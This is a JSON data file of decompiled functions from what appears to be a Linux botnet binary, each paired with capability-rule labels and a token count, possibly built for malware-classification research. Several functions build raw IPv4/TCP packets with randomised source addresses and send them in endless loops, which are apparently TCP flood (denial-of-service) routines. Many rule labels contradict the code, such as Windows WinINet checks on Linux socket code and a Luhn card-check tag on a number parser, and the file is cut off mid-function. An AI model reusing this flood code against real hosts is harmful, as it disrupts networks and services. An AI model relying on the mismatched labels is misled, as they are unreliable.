{
    "080480c0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x080480ef)\n\nvoid fcn.080480c0(void)\n\n{\n    code *pcVar1;\n    \n    if (*0x8056780 == '\\0') {\n        while (pcVar1 = **0x8056524,  pcVar1 != NULL) {\n            *0x8056524 = *0x8056524 + 1;\n            (*pcVar1)();\n        }\n        *0x8056780 = '\\x01';\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "0804e800": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.0804e800(char *param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    \n    do {\n        do {\n            pcVar7 = param_1;\n            cVar1 = *pcVar7;\n            param_1 = pcVar7 + 1;\n        } while (cVar1 == ' ');\n    } while ((cVar1 == '\\t') || (cVar1 == '\\n'));\n    if (cVar1 == '-') {\n        cVar1 = *param_1;\n        uVar4 = 0x80000000;\n        param_1 = pcVar7 + 2;\n        bVar2 = true;\n    }\n    else {\n        if (cVar1 == '+') {\n            cVar1 = *param_1;\n            param_1 = pcVar7 + 2;\n        }\n        uVar4 = 0x7fffffff;\n        bVar2 = false;\n    }\n    uVar3 = uVar4 / param_2;\n    uVar6 = 0;\n    iVar8 = 0;\n    do {\n        if (cVar1 - 0x30U < 10) {\n            iVar5 = cVar1 + -0x30;\n        }\n        else {\n            iVar5 = 0x37;\n            if (0x19 < cVar1 + 0xbfU) {\n                if (0x19 < cVar1 + 0x9fU) {\ncode_r0x0804e8ba:\n                    if (iVar8 < 0) {\n                        return 0x80000000 - !bVar2;\n                    }\n                    if (bVar2) {\n                        uVar6 = -uVar6;\n                    }\n                    return uVar6;\n                }\n                iVar5 = 0x57;\n            }\n            iVar5 = cVar1 - iVar5;\n        }\n        if (param_2 <= iVar5) goto code_r0x0804e8ba;\n        if (((iVar8 < 0) || (uVar3 <= uVar6 && uVar6 != uVar3)) || ((uVar6 == uVar3 && (uVar4 % param_2 < iVar5)))) {\n            iVar8 = -1;\n        }\n        else {\n            iVar8 = 1;\n            uVar6 = param_2 * uVar6 + iVar5;\n        }\n        cVar1 = *param_1;\n        param_1 = param_1 + 1;\n    } while( true );\n}\n",
        "token_count": 595
    },
    "08048a50": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nvoid fcn.08048a50(uint8_t param_1, int32_t param_2, uchar param_3, uint param_4)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    uchar uVar4;\n    char cVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint8_t uVar8;\n    uint8_t uVar9;\n    uint8_t uVar10;\n    uint16_t uVar11;\n    uint16_t uVar12;\n    uint16_t uVar13;\n    uint16_t uVar14;\n    ushort uVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    int32_t iVar20;\n    uint32_t uVar21;\n    int32_t iVar22;\n    int32_t iVar23;\n    int32_t iVar24;\n    uint uVar25;\n    char cVar26;\n    uint32_t extraout_ECX;\n    int32_t iVar27;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    ulong uVar28;\n    int32_t iStack20;\n    \n    uVar17 = param_1;\n    iVar18 = fcn.08050b95(uVar17, 4);\n    uVar3 = fcn.08048690(param_3, param_4, 2, 0);\n    uVar11 = fcn.08048690(param_3, param_4, 3, 0xffff);\n    uVar4 = fcn.08048690(param_3, param_4, 4, 0x40);\n    cVar5 = fcn.08048690(param_3, param_4, 5, 1);\n    uVar12 = fcn.08048690(param_3, param_4, 6, 0xffff);\n    uVar13 = fcn.08048690(param_3, param_4, 7, 0xffff);\n    iVar19 = fcn.08048690(param_3, param_4, 0x11, 0xffff);\n    iVar20 = fcn.08048690(param_3, param_4, 0x12, 0);\n    uVar6 = fcn.08048690(param_3, param_4, 0xb, 0);\n    uVar7 = fcn.08048690(param_3, param_4, 0xc, 0);\n    uVar8 = fcn.08048690(param_3, param_4, 0xd, 0);\n    uVar21 = fcn.08048690(param_3, param_4, 0xe, 0);\n    uVar9 = fcn.08048690(param_3, param_4, 0xf, 1);\n    uVar10 = fcn.08048690(param_3, param_4, 0x10, 0);\n    iVar22 = fcn.08048630(param_3, param_4, 0x19, *0x80588a0);\n    iVar23 = fcn.080503d0(2, 3, 6);\n    if (iVar23 == -1) {\n        do {\n            fcn.08051819(1);\n            fcn.08051819(1);\n        } while( true );\n    }\n    iStack20 = 1;\n    iVar24 = fcn.08050395(iVar23, 0, 3, &iStack20, 4);\n    if (iVar24 == -1) {\n        fcn.0804eaab(iVar23);\n        do {\n            fcn.08051819(1);\n        } while( true );\n    }\n    iStack20 = 0;\n    if (uVar17 != 0) {\n        uVar21 = uVar21 & 1;\n        cVar26 = uVar21;\n        do {\n            iVar24 = iStack20;\n            uVar25 = fcn.08050b95(0x80, 1, uVar21, uVar21);\n            *(iVar18 + iVar24 * 4) = uVar25;\n            puVar1 = *(iVar18 + iStack20 * 4);\n            *puVar1 = 0x45;\n            *(puVar1 + 2) = 0xac03;\n            puVar1[1] = uVar3;\n            *(puVar1 + 4) = uVar11 >> 8 | uVar11 << 8;\n            puVar1[8] = uVar4;\n            if (cVar5 != '\\0') {\n                *(puVar1 + 6) = 0x40;\n            }\n            puVar1[9] = 6;\n            *(puVar1 + 0xc) = iVar22;\n            *(puVar1 + 0x10) = *(param_2 + 0x10 + iStack20 * 0x18);\n            *(puVar1 + 0x14) = uVar12 >> 8 | uVar12 << 8;\n            *(puVar1 + 0x16) = uVar13 >> 8 | uVar13 << 8;\n            *(puVar1 + 0x18) = iVar19 >> 8 | iVar19 << 8;\n            puVar1[0x20] = puVar1[0x20] & 0xf | 0xa0;\n            puVar1[0x21] = puVar1[0x21] & 0xc0 | (uVar6 & 1) << 5 | (uVar7 & 1) << 4 | (uVar8 & 1) << 3 | cVar26 << 2 |\n                           (uVar9 & 1) * '\\x02' | uVar10 & 1;\n            puVar1[0x28] = 2;\n            puVar1[0x29] = 4;\n            uVar14 = fcn.0804db30();\n            puVar1[0x2c] = 4;\n            puVar1[0x2d] = 2;\n            uVar14 = (uVar14 & 0xf) + 0x578;\n            puVar1[0x2e] = 8;\n            puVar1[0x2f] = 10;\n            *(puVar1 + 0x2a) = uVar14 >> 8 | uVar14 * 0x100;\n            uVar25 = fcn.0804db30();\n            *(puVar1 + 0x34) = 0;\n            *(puVar1 + 0x30) = uVar25;\n            puVar1[0x38] = 1;\n            puVar1[0x39] = 3;\n            puVar1[0x3a] = 3;\n            puVar1[0x3b] = 6;\n            iStack20 = iStack20 + 1;\n            uVar21 = extraout_ECX;\n        } while (iStack20 < uVar17);\n    }\n    do {\n        do {\n        } while (uVar17 == 0);\n        iStack20 = 0;\n        do {\n            iVar2 = *(iVar18 + iStack20 * 4);\n            iVar24 = param_2 + iStack20 * 0x18;\n            iVar27 = iVar18;\n            if (*(iVar24 + 0x14) < 0x20) {\n                uVar25 = *(iVar24 + 0x10);\n                uVar21 = fcn.0804db30();\n                uVar14 = uVar25;\n                uVar16 = uVar25 >> 0x10;\n                iVar24 = (uVar21 >> (*(param_2 + 0x14 + iStack20 * 0x18) & 0x1f)) +\n                         CONCAT22(uVar14 >> 8 | uVar14 << 8, uVar16 >> 8 | uVar16 << 8);\n                uVar14 = iVar24;\n                uVar16 = iVar24 >> 0x10;\n                *(iVar2 + 0x10) = CONCAT22(uVar14 >> 8 | uVar14 << 8, uVar16 >> 8 | uVar16 << 8);\n                iVar27 = param_2;\n            }\n            if (iVar22 == -1) {\n                uVar28 = fcn.0804db30();\n                iVar27 = uVar28 >> 0x20;\n                *(iVar2 + 0xc) = uVar28;\n            }\n            if (uVar11 == 0xffff) {\n                uVar15 = fcn.0804db30();\n                *(iVar2 + 4) = uVar15;\n                iVar27 = extraout_EDX;\n            }\n            if (uVar12 == 0xffff) {\n                uVar15 = fcn.0804db30();\n                *(iVar2 + 0x14) = uVar15;\n                iVar27 = extraout_EDX_00;\n            }\n            if (uVar13 == 0xffff) {\n                uVar15 = fcn.0804db30();\n                *(iVar2 + 0x16) = uVar15;\n                iVar27 = extraout_EDX_01;\n            }\n            if (iVar19 == 0xffff) {\n                uVar28 = fcn.0804db30();\n                iVar27 = uVar28 >> 0x20;\n                *(iVar2 + 0x18) = uVar28;\n            }\n            if (iVar20 == 0xffff) {\n                uVar28 = fcn.0804db30();\n                iVar27 = uVar28 >> 0x20;\n                *(iVar2 + 0x1c) = uVar28;\n            }\n            if (uVar6 != 0) {\n                uVar15 = fcn.0804db30();\n                *(iVar2 + 0x26) = uVar15;\n                iVar27 = extraout_EDX_02;\n            }\n            *(iVar2 + 10) = 0;\n            uVar15 = fcn.0804bd80(iVar2, 0x14, iVar27, iVar27);\n            *(iVar2 + 10) = uVar15;\n            *(iVar2 + 0x24) = 0;\n            uVar15 = fcn.0804bdd0(iVar2, iVar2 + 0x14, 0x9803, 0x398);\n            *(iVar2 + 0x24) = uVar15;\n            *(iStack20 * 0x18 + 2 + param_2) = *(iVar2 + 0x16);\n            fcn.08050352(iVar23, iVar2, 0x3ac, 0x4000, iStack20 * 0x18 + param_2, 0x10);\n            iStack20 = iStack20 + 1;\n        } while (iStack20 < uVar17);\n    } while( true );\n}\n",
        "token_count": 2468
    },
    "08048f90": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nvoid fcn.08048f90(uint8_t param_1, int32_t param_2, uchar param_3, uint param_4)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    uchar uVar4;\n    char cVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint8_t uVar8;\n    uint8_t uVar9;\n    uint8_t uVar10;\n    char cVar11;\n    uint16_t uVar12;\n    uint16_t uVar13;\n    uint16_t uVar14;\n    uint16_t uVar15;\n    ushort uVar16;\n    uint16_t uVar17;\n    uint32_t uVar18;\n    int32_t iVar19;\n    int32_t iVar20;\n    int32_t iVar21;\n    uint32_t uVar22;\n    int32_t iVar23;\n    int32_t iVar24;\n    int32_t iVar25;\n    uint uVar26;\n    int32_t iStack20;\n    \n    uVar18 = param_1;\n    iVar19 = fcn.08050b95(uVar18, 4);\n    uVar3 = fcn.08048690(param_3, param_4, 2, 0);\n    uVar12 = fcn.08048690(param_3, param_4, 3, 0xffff);\n    uVar4 = fcn.08048690(param_3, param_4, 4, 0x40);\n    cVar5 = fcn.08048690(param_3, param_4, 5, 1);\n    uVar13 = fcn.08048690(param_3, param_4, 6, 0xffff);\n    uVar14 = fcn.08048690(param_3, param_4, 7, 0xffff);\n    iVar20 = fcn.08048690(param_3, param_4, 0x11, 0xffff);\n    iVar21 = fcn.08048690(param_3, param_4, 0x12, 0);\n    uVar6 = fcn.08048690(param_3, param_4, 0xb, 0);\n    uVar7 = fcn.08048690(param_3, param_4, 0xc, 0);\n    uVar8 = fcn.08048690(param_3, param_4, 0xd, 0);\n    uVar9 = fcn.08048690(param_3, param_4, 0xe, 0);\n    uVar22 = fcn.08048690(param_3, param_4, 0xf, 0);\n    uVar10 = fcn.08048690(param_3, param_4, 0x10, 0);\n    iVar23 = fcn.08048630(param_3, param_4, 0x19, *0x80588a0);\n    iVar24 = fcn.080503d0(2, 3, 6);\n    if (iVar24 != -1) {\n        iStack20 = 1;\n        iVar25 = fcn.08050395(iVar24, 0, 3, &iStack20, 4);\n        if (iVar25 != -1) {\n            iStack20 = 0;\n            if (uVar18 != 0) {\n                uVar22 = uVar22 & 1;\n                cVar11 = uVar22;\n                do {\n                    iVar25 = iStack20;\n                    uVar26 = fcn.08050b95(0x80, 1, uVar22, uVar22);\n                    *(iVar19 + iVar25 * 4) = uVar26;\n                    puVar1 = *(iVar19 + iStack20 * 4);\n                    *puVar1 = 0x45;\n                    *(puVar1 + 2) = 0x3c00;\n                    puVar1[1] = uVar3;\n                    *(puVar1 + 4) = uVar12 >> 8 | uVar12 << 8;\n                    puVar1[8] = uVar4;\n                    if (cVar5 != '\\0') {\n                        *(puVar1 + 6) = 0x40;\n                    }\n                    puVar1[9] = 6;\n                    *(puVar1 + 0xc) = iVar23;\n                    *(puVar1 + 0x10) = *(param_2 + 0x10 + iStack20 * 0x18);\n                    *(puVar1 + 0x14) = uVar13 >> 8 | uVar13 << 8;\n                    *(puVar1 + 0x16) = uVar14 >> 8 | uVar14 << 8;\n                    *(puVar1 + 0x18) = iVar20 >> 8 | iVar20 << 8;\n                    puVar1[0x20] = puVar1[0x20] & 0xf | 0xa0;\n                    puVar1[0x21] = puVar1[0x21] & 0xc0 | (uVar6 & 1) << 5 | (uVar7 & 1) << 4 | (uVar8 & 1) << 3 |\n                                   (uVar9 & 1) << 2 | cVar11 * '\\x02' | uVar10 & 1;\n                    puVar1[0x28] = 2;\n                    puVar1[0x29] = 4;\n                    uVar15 = fcn.0804db30();\n                    puVar1[0x2c] = 4;\n                    puVar1[0x2d] = 2;\n                    uVar15 = (uVar15 & 0xf) + 0x578;\n                    puVar1[0x2e] = 8;\n                    puVar1[0x2f] = 10;\n                    *(puVar1 + 0x2a) = uVar15 >> 8 | uVar15 * 0x100;\n                    uVar22 = fcn.0804db30();\n                    *(puVar1 + 0x34) = 0;\n                    *(puVar1 + 0x30) = uVar22;\n                    puVar1[0x38] = 1;\n                    puVar1[0x39] = 3;\n                    puVar1[0x3a] = 3;\n                    puVar1[0x3b] = 6;\n                    iStack20 = iStack20 + 1;\n                } while (iStack20 < uVar18);\n            }\n            do {\n                do {\n                } while (uVar18 == 0);\n                iStack20 = 0;\n                do {\n                    iVar2 = *(iVar19 + iStack20 * 4);\n                    iVar25 = param_2 + iStack20 * 0x18;\n                    if (*(iVar25 + 0x14) < 0x20) {\n                        uVar26 = *(iVar25 + 0x10);\n                        uVar22 = fcn.0804db30();\n                        uVar15 = uVar26;\n                        uVar17 = uVar26 >> 0x10;\n                        iVar25 = (uVar22 >> (*(param_2 + 0x14 + iStack20 * 0x18) & 0x1f)) +\n                                 CONCAT22(uVar15 >> 8 | uVar15 << 8, uVar17 >> 8 | uVar17 << 8);\n                        uVar15 = iVar25;\n                        uVar17 = iVar25 >> 0x10;\n                        iVar25 = CONCAT22(uVar15 >> 8 | uVar15 << 8, uVar17 >> 8 | uVar17 << 8);\n                        *(iVar2 + 0x10) = iVar25;\n                    }\n                    if (iVar23 == -1) {\n                        iVar25 = fcn.0804db30();\n                        *(iVar2 + 0xc) = iVar25;\n                    }\n                    if (uVar12 == 0xffff) {\n                        iVar25 = fcn.0804db30();\n                        *(iVar2 + 4) = iVar25;\n                    }\n                    if (uVar13 == 0xffff) {\n                        iVar25 = fcn.0804db30();\n                        *(iVar2 + 0x14) = iVar25;\n                    }\n                    if (uVar14 == 0xffff) {\n                        iVar25 = fcn.0804db30();\n                        *(iVar2 + 0x16) = iVar25;\n                    }\n                    if (iVar20 == 0xffff) {\n                        iVar25 = fcn.0804db30();\n                        *(iVar2 + 0x18) = iVar25;\n                    }\n                    if (iVar21 == 0xffff) {\n                        iVar25 = fcn.0804db30();\n                        *(iVar2 + 0x1c) = iVar25;\n                    }\n                    if (uVar6 != 0) {\n                        iVar25 = fcn.0804db30();\n                        *(iVar2 + 0x26) = iVar25;\n                    }\n                    *(iVar2 + 10) = 0;\n                    uVar16 = fcn.0804bd80(iVar2, 0x14, iVar25, iVar25);\n                    *(iVar2 + 10) = uVar16;\n                    *(iVar2 + 0x24) = 0;\n                    uVar16 = fcn.0804bdd0(iVar2, iVar2 + 0x14, 0x2800, 0x28);\n                    *(iVar2 + 0x24) = uVar16;\n                    *(iStack20 * 0x18 + 2 + param_2) = *(iVar2 + 0x16);\n                    fcn.08050352(iVar24, iVar2, 0x3c, 0x4000, iStack20 * 0x18 + param_2, 0x10);\n                    iStack20 = iStack20 + 1;\n                } while (iStack20 < uVar18);\n            } while( true );\n        }\n        fcn.0804eaab(iVar24);\n    }\n    return;\n}\n",
        "token_count": 2248
    },
    "080494b0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nvoid fcn.080494b0(uint8_t param_1, int32_t param_2, uint8_t param_3, int32_t param_4)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    uchar uVar4;\n    char cVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint8_t uVar8;\n    uint8_t uVar9;\n    uint8_t uVar10;\n    uint8_t uVar11;\n    uint16_t uVar12;\n    uint16_t uVar13;\n    uint16_t uVar14;\n    int16_t iVar15;\n    uint16_t uVar16;\n    ushort uVar17;\n    uint16_t uVar18;\n    uint32_t uVar19;\n    int32_t iVar20;\n    int32_t iVar21;\n    int32_t iVar22;\n    int32_t iVar23;\n    int32_t iVar24;\n    int32_t iVar25;\n    uint uVar26;\n    uint32_t uVar27;\n    uchar *puVar28;\n    int32_t iStack20;\n    \n    puVar28 = param_3;\n    uVar19 = param_1;\n    iVar20 = fcn.08050b95(uVar19, 4);\n    uVar3 = fcn.08048690(puVar28, param_4, 2, 0);\n    uVar12 = fcn.08048690(puVar28, param_4, 3, 0xffff);\n    uVar4 = fcn.08048690(puVar28, param_4, 4, 0x40);\n    cVar5 = fcn.08048690(puVar28, param_4, 5, 1);\n    uVar13 = fcn.08048690(puVar28, param_4, 6, 0xffff);\n    uVar14 = fcn.08048690(puVar28, param_4, 7, 0xffff);\n    iVar21 = fcn.08048690(puVar28, param_4, 0x11, 0xffff);\n    iVar22 = fcn.08048690(puVar28, param_4, 0x12, 0);\n    uVar6 = fcn.08048690(puVar28, param_4, 0xb, 0);\n    uVar7 = fcn.08048690(puVar28, param_4, 0xc, 0);\n    uVar8 = fcn.08048690(puVar28, param_4, 0xd, 0);\n    uVar9 = fcn.08048690(puVar28, param_4, 0xe, 0);\n    uVar10 = fcn.08048690(puVar28, param_4, 0xf, 1);\n    uVar11 = fcn.08048690(puVar28, param_4, 0x10, 0);\n    iVar23 = fcn.08048630(puVar28, param_4, 0x19, *0x80588a0);\n    iVar24 = fcn.080503d0(2, 3, 6);\n    if (iVar24 != -1) {\n        iStack20 = 1;\n        iVar25 = fcn.08050395(iVar24, 0, 3, &iStack20, 4);\n        if (iVar25 != -1) {\n            iStack20 = 0;\n            if (uVar19 != 0) {\n                do {\n                    iVar25 = iStack20;\n                    uVar26 = fcn.08050b95(0x80, 1, puVar28, puVar28);\n                    *(iVar20 + iVar25 * 4) = uVar26;\n                    puVar1 = *(iVar20 + iStack20 * 4);\n                    *puVar1 = 0x45;\n                    puVar28 = puVar1 + 0x14;\n                    *(puVar1 + 2) = 0x3c00;\n                    puVar1[1] = uVar3;\n                    *(puVar1 + 4) = uVar12 >> 8 | uVar12 << 8;\n                    puVar1[8] = uVar4;\n                    if (cVar5 != '\\0') {\n                        *(puVar1 + 6) = 0x40;\n                    }\n                    puVar1[9] = 6;\n                    *(puVar1 + 0xc) = iVar23;\n                    *(puVar1 + 0x10) = *(param_2 + 0x10 + iStack20 * 0x18);\n                    *(puVar1 + 0x14) = uVar13 >> 8 | uVar13 << 8;\n                    *(puVar1 + 0x16) = uVar14 >> 8 | uVar14 << 8;\n                    *(puVar1 + 0x18) = iVar21 >> 8 | iVar21 << 8;\n                    puVar1[0x20] = puVar1[0x20] & 0xf | 0xa0;\n                    puVar1[0x21] = puVar1[0x21] & 0xc0 | (uVar6 & 1) << 5 | (uVar7 & 1) << 4 | (uVar8 & 1) << 3 |\n                                   (uVar9 & 1) << 2 | (uVar10 & 1) * '\\x02' | uVar11 & 1;\n                    iVar15 = fcn.0804db30();\n                    *(puVar1 + 0x22) = iVar15 + 9000U >> 8 | (iVar15 + 9000U) * 0x100;\n                    puVar1[0x28] = 2;\n                    puVar1[0x29] = 4;\n                    uVar16 = fcn.0804db30();\n                    puVar1[0x2c] = 4;\n                    puVar1[0x2d] = 2;\n                    uVar16 = (uVar16 & 0xf) + 0x563;\n                    puVar1[0x2e] = 8;\n                    puVar1[0x2f] = 10;\n                    *(puVar1 + 0x2a) = uVar16 >> 8 | uVar16 * 0x100;\n                    uVar26 = fcn.0804db30();\n                    *(puVar1 + 0x34) = 0;\n                    *(puVar1 + 0x30) = uVar26;\n                    puVar1[0x38] = 1;\n                    puVar1[0x39] = 3;\n                    puVar1[0x3a] = 3;\n                    puVar1[0x3b] = 6;\n                    param_4 = iStack20 + 1;\n                    iStack20 = param_4;\n                } while (param_4 < uVar19);\n            }\n            do {\n                do {\n                } while (uVar19 == 0);\n                iStack20 = 0;\n                do {\n                    iVar2 = *(iVar20 + iStack20 * 4);\n                    iVar25 = param_2 + iStack20 * 0x18;\n                    if (*(iVar25 + 0x14) < 0x20) {\n                        uVar26 = *(iVar25 + 0x10);\n                        uVar27 = fcn.0804db30();\n                        uVar16 = uVar26;\n                        uVar18 = uVar26 >> 0x10;\n                        param_4 = CONCAT22(uVar16 >> 8 | uVar16 << 8, uVar18 >> 8 | uVar18 << 8);\n                        iVar25 = (uVar27 >> (*(param_2 + 0x14 + iStack20 * 0x18) & 0x1f)) + param_4;\n                        uVar16 = iVar25;\n                        uVar18 = iVar25 >> 0x10;\n                        *(iVar2 + 0x10) = CONCAT22(uVar16 >> 8 | uVar16 << 8, uVar18 >> 8 | uVar18 << 8);\n                    }\n                    if (iVar23 == -1) {\n                        uVar26 = fcn.0804db30();\n                        *(iVar2 + 0xc) = uVar26;\n                    }\n                    if (uVar12 == 0xffff) {\n                        uVar17 = fcn.0804db30();\n                        *(iVar2 + 4) = uVar17;\n                    }\n                    if (uVar13 == 0xffff) {\n                        uVar17 = fcn.0804db30();\n                        *(iVar2 + 0x14) = uVar17;\n                    }\n                    if (uVar14 == 0xffff) {\n                        uVar17 = fcn.0804db30();\n                        *(iVar2 + 0x16) = uVar17;\n                    }\n                    if (iVar21 == 0xffff) {\n                        uVar26 = fcn.0804db30();\n                        *(iVar2 + 0x18) = uVar26;\n                    }\n                    if (iVar22 == 0xffff) {\n                        uVar26 = fcn.0804db30();\n                        *(iVar2 + 0x1c) = uVar26;\n                    }\n                    if (uVar6 != 0) {\n                        uVar17 = fcn.0804db30();\n                        *(iVar2 + 0x26) = uVar17;\n                    }\n                    *(iVar2 + 10) = 0;\n                    uVar17 = fcn.0804bd80(iVar2, 0x14, param_4, param_4);\n                    *(iVar2 + 10) = uVar17;\n                    *(iVar2 + 0x24) = 0;\n                    uVar17 = fcn.0804bdd0(iVar2, iVar2 + 0x14, 0x2800, 0x28);\n                    *(iVar2 + 0x24) = uVar17;\n                    *(iStack20 * 0x18 + 2 + param_2) = *(iVar2 + 0x16);\n                    fcn.08050352(iVar24, iVar2, 0x3c, 0x4000, iStack20 * 0x18 + param_2, 0x10);\n                    iStack20 = iStack20 + 1;\n                } while (iStack20 < uVar19);\n            } while( true );\n        }\n        fcn.0804eaab(iVar24);\n    }\n    return;\n}\n",
        "token_count": 2366
    },
    "0804a050": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nvoid fcn.0804a050(uint8_t param_1, uint32_t param_2, uchar param_3, uint param_4)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    uchar uVar4;\n    char cVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint8_t uVar8;\n    char cVar9;\n    uint8_t uVar10;\n    uint16_t uVar11;\n    uint16_t uVar12;\n    uint16_t uVar13;\n    ushort uVar14;\n    uint16_t uVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    int32_t iVar20;\n    uint32_t uVar21;\n    uint32_t uVar22;\n    uint32_t uVar23;\n    int32_t iVar24;\n    int32_t iVar25;\n    int32_t iVar26;\n    int32_t iVar27;\n    uint uVar28;\n    uint16_t uVar29;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    uint32_t extraout_ECX_02;\n    uint32_t extraout_ECX_03;\n    uint32_t extraout_ECX_04;\n    uint32_t extraout_ECX_05;\n    int32_t iStack132;\n    int32_t iStack128;\n    int32_t iStack20;\n    \n    uVar17 = param_1;\n    iVar18 = fcn.08050b95(uVar17, 4);\n    uVar3 = fcn.08048690(param_3, param_4, 2, 0);\n    uVar11 = fcn.08048690(param_3, param_4, 3, 0xffff);\n    uVar4 = fcn.08048690(param_3, param_4, 4, 0x40);\n    cVar5 = fcn.08048690(param_3, param_4, 5, 0);\n    uVar12 = fcn.08048690(param_3, param_4, 6, 0xffff);\n    uVar13 = fcn.08048690(param_3, param_4, 7, 0xffff);\n    iVar19 = fcn.08048690(param_3, param_4, 0x11, 0xffff);\n    iVar20 = fcn.08048690(param_3, param_4, 0x12, 0xffff);\n    uVar21 = fcn.08048690(param_3, param_4, 0xb, 0);\n    uVar22 = fcn.08048690(param_3, param_4, 0xc, 1);\n    uVar6 = fcn.08048690(param_3, param_4, 0xd, 0);\n    uVar7 = fcn.08048690(param_3, param_4, 0xe, 0);\n    uVar8 = fcn.08048690(param_3, param_4, 0xf, 0);\n    uVar23 = fcn.08048690(param_3, param_4, 0x10, 0);\n    iVar24 = fcn.08048690(param_3, param_4, 0, 0x200);\n    cVar9 = fcn.08048690(param_3, param_4, 1, 1);\n    iVar25 = fcn.08048630(param_3, param_4, 0x19, *0x80588a0);\n    iVar26 = fcn.080503d0(2, 3, 6);\n    if (iVar26 == -1) {\n        do {\n            fcn.08051819(1);\n            fcn.08051819(1);\n        } while( true );\n    }\n    iStack20 = 1;\n    iVar27 = fcn.08050395(iVar26, 0, 3, &iStack20, 4);\n    if (iVar27 == -1) {\n        fcn.0804eaab(iVar26);\n        do {\n            fcn.08051819(1);\n        } while( true );\n    }\n    iStack20 = 0;\n    if (uVar17 != 0) {\n        uVar29 = iVar24 + 0x28;\n        uVar23 = uVar23 & 1;\n        uVar10 = uVar23;\n        do {\n            iVar27 = iStack20;\n            uVar28 = fcn.08050b95(0x5e6, 1, uVar23, uVar23);\n            *(iVar18 + iVar27 * 4) = uVar28;\n            puVar1 = *(iVar18 + iStack20 * 4);\n            *puVar1 = 0x45;\n            puVar1[1] = uVar3;\n            *(puVar1 + 2) = uVar29 >> 8 | uVar29 * 0x100;\n            *(puVar1 + 4) = uVar11 >> 8 | uVar11 << 8;\n            puVar1[8] = uVar4;\n            if (cVar5 != '\\0') {\n                *(puVar1 + 6) = 0x40;\n            }\n            puVar1[9] = 6;\n            *(puVar1 + 0xc) = iVar25;\n            *(puVar1 + 0x10) = *(param_2 + 0x10 + iStack20 * 0x18);\n            *(puVar1 + 0x14) = uVar12 >> 8 | uVar12 << 8;\n            *(puVar1 + 0x16) = uVar13 >> 8 | uVar13 << 8;\n            *(puVar1 + 0x18) = iVar19 >> 8 | iVar19 << 8;\n            puVar1[0x20] = puVar1[0x20] & 0xf | 0x50;\n            puVar1[0x21] = puVar1[0x21] & 0xc0 | (uVar21 & 1) << 5 | (uVar22 & 1) << 4 | (uVar6 & 1) << 3 |\n                           